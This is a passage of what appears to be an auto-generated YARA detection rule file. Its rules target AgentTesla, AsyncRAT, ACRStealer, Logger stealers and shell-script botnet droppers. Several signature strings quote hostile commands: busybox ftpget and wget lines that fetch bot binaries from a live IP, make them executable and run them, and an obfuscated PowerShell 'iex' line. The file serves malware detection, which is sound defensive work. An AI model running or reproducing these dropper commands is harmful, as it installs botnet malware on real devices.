      $s15 = "Xgane3eJ9dr6l7f7fmsEMt9okcdgQuyEKrUnSAeK5ukEybsb1O5U1cuepb2McZEdW3ZWMHuoqyXvoSB0qn9M5Mt6IdYzG83bHoFk0PK3aMdvvjVbJWWdD9zSKFaJ1dMP" ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e5858931 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e5858931.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5858931d0359e9ca3d4c877c84229dece01066ebfabc238093df4ce539dc873"
   strings:
      $s1 = "vAeF.exe" fullword wide /* score: '22.00'*/
      $s2 = "vAeF.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "ZHHHHH" fullword ascii /* reversed goodware string 'HHHHHZ' */ /* score: '13.50'*/
      $s4 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s5 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s6 = "vRh!!!!!" fullword ascii /* score: '10.00'*/
      $s7 = "VRh!!!!!" fullword ascii /* score: '10.00'*/
      $s8 = "ERh!!!!!" fullword ascii /* score: '10.00'*/
      $s9 = "#Rh!!!!!" fullword ascii /* score: '10.00'*/
      $s10 = "4Rh!!!!!" fullword ascii /* score: '10.00'*/
      $s11 = "_zRh!!!!!" fullword ascii /* score: '10.00'*/
      $s12 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s13 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s14 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s15 = "get_Accuracy" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_9ece9475ed92b0c57e7499f69856122750963ff404753ab0cbaf607485f1a073_9ece9475 {
   meta:
      description = "_subset_batch - file 9ece9475ed92b0c57e7499f69856122750963ff404753ab0cbaf607485f1a073_9ece9475.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ece9475ed92b0c57e7499f69856122750963ff404753ab0cbaf607485f1a073"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox ftpget 77.83.240.93 bot.spc bot.spc ; chmod 777 bot" ascii /* score: '27.00'*/
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox ftpget 77.83.240.93 bot.ppc bot.ppc ; chmod 777 bot" ascii /* score: '27.00'*/
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.spc ; /bin/busybox ftpget 77.83.240.93 bot.spc bot.spc ; chmod 777 bot" ascii /* score: '27.00'*/
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.ppc ; /bin/busybox ftpget 77.83.240.93 bot.ppc bot.ppc ; chmod 777 bot" ascii /* score: '27.00'*/
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm4 ; /bin/busybox ftpget 77.83.240.93 bot.arm4 bot.arm4 ; chmod 777 " ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm7 ; /bin/busybox ftpget 77.83.240.93 bot.arm7 bot.arm7 ; chmod 777 " ascii /* score: '24.00'*/
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox ftpget 77.83.240.93 bot.i686 bot.i686 ; chmod 777 " ascii /* score: '24.00'*/
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i686 ; /bin/busybox ftpget 77.83.240.93 bot.i686 bot.i686 ; chmod 777 " ascii /* score: '24.00'*/
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mips ; /bin/busybox ftpget 77.83.240.93 bot.mips bot.mips ; chmod 777 " ascii /* score: '24.00'*/
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.m68k ; /bin/busybox ftpget 77.83.240.93 bot.m68k bot.m68k ; chmod 777 " ascii /* score: '24.00'*/
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.mipsel ; /bin/busybox ftpget 77.83.240.93 bot.mipsel bot.mipsel ; chmo" ascii /* score: '24.00'*/
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm6 ; /bin/busybox ftpget 77.83.240.93 bot.arm6 bot.arm6 ; chmod 777 " ascii /* score: '24.00'*/
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.i586 ; /bin/busybox ftpget 77.83.240.93 bot.i586 bot.i586 ; chmod 777 " ascii /* score: '24.00'*/
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm5 ; /bin/busybox ftpget 77.83.240.93 bot.arm5 bot.arm5 ; chmod 777 " ascii /* score: '24.00'*/
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf bot.arm7 ; /bin/busybox ftpget 77.83.240.93 bot.arm7 bot.arm7 ; chmod 777 " ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 4KB and
      8 of them
}

rule ACRStealer_signature__2 {
   meta:
      description = "_subset_batch - file ACRStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "227d86bd3159451e21338b3b553d9c6da53544149e0f64ac92f9cf6a78ea6bf7"
   strings:
      $s1 = "Upd@te!D/VCRUNTIME140.dll" fullword ascii /* score: '23.00'*/
      $s2 = "Upd@te!D/Qt5Core.dll" fullword ascii /* score: '20.00'*/
      $s3 = "Upd@te!D/x64/tradingnetworkingsockets.dll" fullword ascii /* score: '20.00'*/
      $s4 = "Upd@te!D/x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s5 = "Upd@te!D/FileAssociation.dll" fullword ascii /* score: '20.00'*/
      $s6 = "Upd@te!D/MSVCP140.dll" fullword ascii /* score: '20.00'*/
      $s7 = "Upd@te!D/Qt5Network.dll" fullword ascii /* score: '20.00'*/
      $s8 = "Upd@te!D/SAt~UP.exe" fullword ascii /* score: '16.00'*/
      $s9 = "WnVnQnUnSnW" fullword ascii /* base64 encoded string 'ZugBu'Ju' */ /* score: '14.00'*/
      $s10 = "Upd@te!D/Brund.vdd" fullword ascii /* score: '10.00'*/
      $s11 = "LoMt:\"" fullword ascii /* score: '10.00'*/
      $s12 = "D:\\.zrG" fullword ascii /* score: '10.00'*/
      $s13 = "DbvLc:\"5A" fullword ascii /* score: '10.00'*/
      $s14 = "WEeF:\"" fullword ascii /* score: '10.00'*/
      $s15 = "}7{*{:{&{6{.[" fullword ascii /* score: '9.00'*/ /* hex encoded string 'v' */
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule ae4f7f5c464da4ab462d29cefec4b4e8625858fa3e418588d583196f3cbffb05_ae4f7f5c {
   meta:
      description = "_subset_batch - file ae4f7f5c464da4ab462d29cefec4b4e8625858fa3e418588d583196f3cbffb05_ae4f7f5c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae4f7f5c464da4ab462d29cefec4b4e8625858fa3e418588d583196f3cbffb05"
   strings:
      $s1 = "<a href=3D\"https://www.youtube.com/user/GameModdingPreview\" target=3D\"_b=" fullword ascii /* score: '30.00'*/
      $s2 = "<a href=3D\"https://twitter.com/GameModdingNet\" target=3D\"_blank\" rel=3D\"=" fullword ascii /* score: '27.00'*/
      $s3 = "<a href=3D\"https://vk.com/gamemoddingnet\" target=3D\"_blank\" rel=3D\"noope=" fullword ascii /* score: '27.00'*/
      $s4 = "<a href=3D\"https://www.facebook.com/gamemodding\" target=3D\"_blank\" rel=" fullword ascii /* score: '27.00'*/
      $s5 = "Content-Location: https://gamemodding.com/templates/gamemodding/img/logo.svg" fullword ascii /* score: '27.00'*/
      $s6 = "<a href=3D\"https://gamemodding.com/en/lostpassword/\" class=3D\"forget\" re=" fullword ascii /* score: '26.00'*/
      $s7 = "Subject: GameModding.com - Wot, Skyrim, GTA 4, GTA San Andreas, Fallout, GTA Vice City and Counter-Strike mods with automatic in" ascii /* score: '24.00'*/
      $s8 = "<a href=3D\"https://gamemodding.com/en/#login-form\" class=3D\"btn btn-poli=" fullword ascii /* score: '24.00'*/
      $s9 = "Subject: GameModding.com - Wot, Skyrim, GTA 4, GTA San Andreas, Fallout, GTA Vice City and Counter-Strike mods with automatic in" ascii /* score: '24.00'*/
      $s10 = "://gamemodding.com/templates/gamemodding/img/logo.svg\" alt=3D\"GameModding.c=" fullword ascii /* score: '23.00'*/
      $s11 = "Content-Location: https://cs1.gamemodding.com/posts/2025-04/1745579360_e1c26fa1b133e715748c049186444a95ba3b6cce2045a0d1af8b8df5f" ascii /* score: '23.00'*/
      $s12 = "//gamemodding.com/templates/gamemodding/img/logo.svg\" alt=3D\"logo\"></a>" fullword ascii /* score: '23.00'*/
      $s13 = "Content-Location: https://cs1.gamemodding.com/posts/2020-12/1609423112_ezgif.com-gif-maker-3.jpg" fullword ascii /* score: '23.00'*/
      $s14 = "Content-Location: https://cs1.gamemodding.com/posts/2025-04/1745579360_e1c26fa1b133e715748c049186444a95ba3b6cce2045a0d1af8b8df5f" ascii /* score: '23.00'*/
      $s15 = "/gamemodding.com/templates/gamemodding/img/logo.svg\" alt=3D\"logo\"></a>" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x7246 and filesize < 3000KB and
      8 of them
}

rule a27c9851ad59b8ea7b0a3ce59295e95fead90ecdb60c20d00fddf798ee8a8e56_a27c9851 {
   meta:
      description = "_subset_batch - file a27c9851ad59b8ea7b0a3ce59295e95fead90ecdb60c20d00fddf798ee8a8e56_a27c9851.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a27c9851ad59b8ea7b0a3ce59295e95fead90ecdb60c20d00fddf798ee8a8e56"
   strings:
      $s1 = "// 7981de4f-59ea-46bc-bcdd-487e354cf629 - 638917977811799190" fullword ascii /* score: '12.00'*/
      $s2 = "// 262c5244-bab7-4a43-9938-742d108bfea5 - 638917977811799190" fullword ascii /* score: '12.00'*/
      $s3 = "55,55,60,59,51,56,55,55,59,60,51,56,55,55,59,60,51,60,60,58,60,60,51,60,61,61,57,61,51,64,63,63,64,51,64,63,57,57,51,64,62,59,56" ascii /* score: '9.00'*/ /* hex encoded string 'UU`YQVUUY`QVUUY`Q``X``Q`aaWaQdccdQdcWWQdbYV' */
      $s4 = "64,51,56,56,56,63,61,51,57,60,61,63,51,63,59,61,56,51,58,57,60,61,51,57,55,59,59,51,62,64,56,64,51,64,61,51,56,55,60,56,55,51,61" ascii /* score: '9.00'*/ /* hex encoded string 'dQVVVcaQW`acQcYaVQXW`aQWUYYQbdVdQdaQVU`VUQa' */
      $s5 = "58,63,51,56,55,55,59,55,51,64,63,57,58,51,64,62,58,61,51,64,62,61,62,51,64,62,64,62,51,56,55,55,58,58,51,64,62,60,55,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'XcQVUUYUQdcWXQdbXaQdbabQdbdbQVUUXXQdb`UQVUU' */
      $s6 = "63,57,56,51,64,62,63,56,51,64,63,59,56,51,56,55,55,59,60,51,56,55,55,59,63,51,63,62,59,56,51,56,55,55,57,64,51,64,64,55,55,51,64" ascii /* score: '9.00'*/ /* hex encoded string 'cWVQdbcVQdcYVQVUUY`QVUUYcQcbYVQVUUWdQddUUQd' */
      $s7 = "51,56,55,55,56,56,51,64,63,59,56,51,64,63,59,55,51,64,63,64,63,51,64,62,62,62,51,64,63,63,55,51,64,63,57,57,51,56,55,55,58,63,51" ascii /* score: '9.00'*/ /* hex encoded string 'QVUUVVQdcYVQdcYUQdcdcQdbbbQdccUQdcWWQVUUXcQ' */
      $s8 = "64,51,56,57,59,51,56,55,60,56,55,51,61,55,62,55,51,60,60,58,61,58,51,60,62,57,61,61,51,56,55,61,63,60,51,58,55,56,56,51,56,61,55" ascii /* score: '9.00'*/ /* hex encoded string 'dQVWYQVU`VUQaUbUQ``XaXQ`bWaaQVUac`QXUVVQVaU' */
      $s9 = "55,51,56,55,55,55,60,51,56,55,55,64,59,51,64,63,57,55,51,56,55,55,64,59,51,56,55,55,57,64,51,64,63,57,57,51,64,62,63,55,51,56,55" ascii /* score: '9.00'*/ /* hex encoded string 'UQVUUU`QVUUdYQdcWUQVUUdYQVUUWdQdcWWQdbcUQVU' */
      $s10 = "56,55,55,56,56,51,56,55,55,57,62,51,64,63,64,63,51,56,55,55,57,57,51,56,55,55,58,63,51,64,63,64,60,51,64,62,60,55,51,56,62,51,60" ascii /* score: '9.00'*/ /* hex encoded string 'VUUVVQVUUWbQdcdcQVUUWWQVUUXcQdcd`Qdb`UQVbQ`' */
      $s11 = "51,56,55,55,60,63,51,64,63,57,63,51,56,55,55,59,64,51,64,63,58,55,51,64,63,57,64,51,56,55,55,58,57,51,56,55,55,60,59,51,56,55,55" ascii /* score: '9.00'*/ /* hex encoded string 'QVUU`cQdcWcQVUUYdQdcXUQdcWdQVUUXWQVUU`YQVUU' */
      $s12 = "59,59,51,62,64,56,64,51,62,61,51,56,55,60,56,55,51,61,55,62,55,51,60,60,58,61,58,51,60,62,57,61,61,51,56,55,61,63,60,51,58,55,56" ascii /* score: '9.00'*/ /* hex encoded string 'YYQbdVdQbaQVU`VUQaUbUQ``XaXQ`bWaaQVUac`QXUV' */
      $s13 = "64,63,63,64,51,64,63,63,55,51,56,55,55,57,56,51,56,55,55,58,63,51,64,63,59,59,51,64,62,59,56,51,56,55,55,57,56,51,64,62,62,55,51" ascii /* score: '9.00'*/ /* hex encoded string 'dccdQdccUQVUUWVQVUUXcQdcYYQdbYVQVUUWVQdbbUQ' */
      $s14 = "62,63,55,51,64,62,61,64,51,64,63,58,59,51,64,63,63,62,51,56,55,55,57,62,51,56,55,55,61,58,51,64,62,62,63,51,64,62,59,56,51,64,63" ascii /* score: '9.00'*/ /* hex encoded string 'bcUQdbadQdcXYQdccbQVUUWbQVUUaXQdbbcQdbYVQdc' */
      $s15 = "51,56,55,55,59,61,51,64,61,57,59,51,56,55,55,59,62,51,64,62,62,62,51,56,55,55,61,60,51,64,62,59,56,51,64,63,57,57,51,64,63,57,55" ascii /* score: '9.00'*/ /* hex encoded string 'QVUUYaQdaWYQVUUYbQdbbbQVUUa`QdbYVQdcWWQdcWU' */
   condition:
      uint16(0) == 0x0a0d and filesize < 6000KB and
      8 of them
}

rule a2989d7c7869c7d40a34e9bea547069ea782975c7c2b44ed2f65de7508ac4f82_a2989d7c {
   meta:
      description = "_subset_batch - file a2989d7c7869c7d40a34e9bea547069ea782975c7c2b44ed2f65de7508ac4f82_a2989d7c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2989d7c7869c7d40a34e9bea547069ea782975c7c2b44ed2f65de7508ac4f82"
   strings:
      $s1 = "wget http://$IP/arm5;chmod 777 arm5;./arm5 telnet.arm5.wget;rm -rf arm5;" fullword ascii /* score: '19.00'*/
      $s2 = "wget http://$IP/arm7;chmod 777 arm7;./arm7 telnet.arm7.wget;rm -rf arm7;" fullword ascii /* score: '19.00'*/
      $s3 = "wget http://$IP/mpsl;chmod 777 mpsl;./mpsl telnet.mpsl.wget;rm -rf mpsl;" fullword ascii /* score: '19.00'*/
      $s4 = "wget http://$IP/mips;chmod 777 mips;./mips telnet.mips.wget;rm -rf mips;" fullword ascii /* score: '19.00'*/
      $s5 = "wget http://$IP/arm6;chmod 777 arm6;./arm6 telnet.arm6.wget;rm -rf arm6;" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x3d50 and filesize < 1KB and
      all of them
}

rule a2ec02b4f310d44666157350cbfc5c2bda859d1674ee590b34c7e803ec30bc32_a2ec02b4 {
   meta:
      description = "_subset_batch - file a2ec02b4f310d44666157350cbfc5c2bda859d1674ee590b34c7e803ec30bc32_a2ec02b4.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2ec02b4f310d44666157350cbfc5c2bda859d1674ee590b34c7e803ec30bc32"
   strings:
      $s1 = "iex $([char]([byte]0x70)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([" ascii /* score: '8.00'*/
      $s2 = "iex $([char]([byte]0x70)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6569 and filesize < 100KB and
      all of them
}

rule a3__Logger_signature__1ee7ec65 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_1ee7ec65.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1ee7ec65b1bc58d31e80803ee28e95cb7c1928d63637e1dfd643d24b012a97e7"
   strings:
      $s1 = "* ;QTG$" fullword ascii /* score: '9.00'*/
      $s2 = "# -+kF" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__21371b611d91188d602926b15db6bd48_imphash__7457d2ac {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_21371b611d91188d602926b15db6bd48(imphash)_7457d2ac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7457d2acc46d71706667c94471b6fbf591eb22cab87df4d9744dc584430ec050"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "vrrxwvov" fullword ascii /* score: '8.00'*/
      $s4 = "psspucw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule a3__Logger_signature__2 {
   meta:
      description = "_subset_batch - file a3--Logger(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d05889fa2aef7ae780aa7aa6ccb000b684029b9bd2815cddb74bbdb9715f0471"
   strings:
      $s1 = "PO20325-23 J-100.scr" fullword ascii /* score: '12.00'*/
      $s2 = "*x2- -" fullword ascii /* score: '9.00'*/
      $s3 = ")aYPcb* " fullword ascii /* score: '8.00'*/
      $s4 = " -sNLs_Q:" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule a3__Logger_signature__3 {
   meta:
      description = "_subset_batch - file a3--Logger(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e2ff650565746cf092c2fdd1f15e3c8e3eea0aa0857f70393e72ea71e121ae8"
   strings:
      $s1 = "Payment Advice Note.xlsx.com.com" fullword ascii /* score: '18.00'*/
      $s2 = "Payment Advice Note.xlsx.com.comPK" fullword ascii /* score: '14.00'*/
      $s3 = "fcinfivc" fullword ascii /* score: '8.00'*/
      $s4 = "quunoum" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__3 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).uue"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "70aa4ba8c99ea2e61d57be523f35beb3a2e1f8f419d2ab28d144101e6e68b64a"
   strings:
      $s1 = "Purchase_Order_PO402984123.exe" fullword ascii /* score: '19.00'*/
      $s2 = "BWPX:\\" fullword ascii /* score: '10.00'*/
      $s3 = "sssqqqp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a89d8803 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a89d8803.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a89d88037e6e7321b7da02290aab0139ddf7be1b697388dcc28fba708304682f"
   strings:
      $s1 = "aIIs.exe" fullword wide /* score: '22.00'*/
      $s2 = "aIIs.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s4 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s5 = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s7 = "Built with .NET Framework 4.0" fullword wide /* score: '10.00'*/
      $s8 = "GetTwinPrimes" fullword ascii /* score: '9.00'*/
      $s9 = "GetProperDivisors" fullword ascii /* score: '9.00'*/
      $s10 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s11 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
      $s12 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s14 = "GetNthPrime" fullword ascii /* score: '9.00'*/
      $s15 = "GetDigitSum" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bf5acaab {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bf5acaab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf5acaab38bf4dfdb4266f9b7605e04f7fb7790577ecffa586bd0dbc793ebee8"
   strings:
      $s1 = "PCZS.exe" fullword wide /* score: '22.00'*/
      $s2 = "IronWardenProcess" fullword ascii /* score: '15.00'*/
      $s3 = ".NET Framework 4.5`H" fullword ascii /* score: '10.00'*/
      $s4 = "ghostNumber" fullword ascii /* score: '9.00'*/
      $s5 = "get_yuksekSkor" fullword ascii /* score: '9.00'*/
      $s6 = "bizimaraba" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ca55a6a7 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ca55a6a7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ca55a6a768df04b644890a40073018ca6938c836b316522f3ef9785eaa5d3589"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "QFE.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "QFE.pdb" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b35104d5 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b35104d5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b35104d529e14b811a2295109a9500fd036a8ec4bb65936ab67068346c4a6b23"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "LDV.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "LDV.pdb" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__31ee9e20 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_31ee9e20.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31ee9e20db0bf4c49fa560640005056239d41f9349516ddada7fe5fec89e7060"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\BWDBTmOgHX\\src\\obj\\Debug\\DNlf.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "DNlf.exe" fullword wide /* score: '22.00'*/
      $s3 = "secrter" fullword ascii /* score: '8.00'*/
      $s4 = "baglanti" fullword ascii /* score: '8.00'*/
      $s5 = "sqlbaglantisi" fullword ascii /* score: '8.00'*/
      $s6 = "Select * From Tbl_Hastalar where HastaTc=@p1" fullword wide /* score: '8.00'*/
      $s7 = "Select * From Tbl_Branslar" fullword wide /* score: '8.00'*/
      $s8 = "Select * From Tbl_Doktorlar where DoktorTC=@p1" fullword wide /* score: '8.00'*/
      $s9 = "Select * From Tbl_Randevular where RandevuDoktor = '" fullword wide /* score: '8.00'*/
      $s10 = "Select * From Tbl_Doktorlar where DoktorTC=@p1 and DoktorSifre=@p2" fullword wide /* score: '8.00'*/
      $s11 = "Select * From Tbl_Doktorlar" fullword wide /* score: '8.00'*/
      $s12 = "Select * From Tbl_Duyurular" fullword wide /* score: '8.00'*/
      $s13 = "Select * From Tbl_Randevular where HastaTC=" fullword wide /* score: '8.00'*/
      $s14 = "Select * From Tbl_Randevular where RandevuBrans = '" fullword wide /* score: '8.00'*/
      $s15 = "Select * From Tbl_Hastalar where HastaTC=@p1 and HastaSifre=@p2" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__10395e36 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10395e36.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "10395e36e0769859496f708845958583ec91bc480ccdceb43900d097ae81e316"
   strings:
      $s1 = "Uixkveukqjo.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteCommonProc" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteBasicProc" fullword ascii /* score: '18.00'*/
      $s4 = "IUixkveukqjo, Version=1.0.4628.23166, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "_EvaluatorProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessAttachedProc" fullword ascii /* score: '15.00'*/
      $s7 = "ProcessSequentialProc" fullword ascii /* score: '15.00'*/
      $s8 = "InvokeDecryptor" fullword ascii /* score: '15.00'*/
      $s9 = "LogTransformableProcessor" fullword ascii /* score: '15.00'*/
      $s10 = "ProcessEvaluator" fullword ascii /* score: '15.00'*/
      $s11 = "m_ProviderEncryptorObj" fullword ascii /* score: '14.00'*/
      $s12 = "DecryptorReporter" fullword ascii /* score: '14.00'*/
      $s13 = "LogHiddenProxy" fullword ascii /* score: '12.00'*/
      $s14 = "LogPassiveTokenizer" fullword ascii /* score: '12.00'*/
      $s15 = "DecryptDynamicDecryptor" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dff90271 {
   meta:
      description = "_subset_batch - file a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dff90271.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dff902719f23c97db2fde737efbc824b27d7591b592762def851dd81695c6e7e"
   strings:
      $s1 = "Mzjzbis.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteCustomizableRecommender" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteRemoteFinalizer" fullword ascii /* score: '21.00'*/
      $s4 = "ExecuteRemoteSingleton" fullword ascii /* score: '21.00'*/
      $s5 = "ExecuteMixedConfig" fullword ascii /* score: '21.00'*/
      $s6 = "ReportReadableLogger" fullword ascii /* score: '20.00'*/
      $s7 = "ExecuteMonoSender" fullword ascii /* score: '18.00'*/
      $s8 = "ExecuteConcreteChooser" fullword ascii /* score: '18.00'*/
      $s9 = "ExecuteIterableCreator" fullword ascii /* score: '18.00'*/
      $s10 = "ExecuteModularEmitter" fullword ascii /* score: '18.00'*/
      $s11 = "ExecuteExternalQueue" fullword ascii /* score: '18.00'*/
      $s12 = "ExecuteScheduledThread" fullword ascii /* score: '18.00'*/
      $s13 = "ExecuteGlobalBridge" fullword ascii /* score: '18.00'*/
      $s14 = "ExecuteHiddenManager" fullword ascii /* score: '18.00'*/
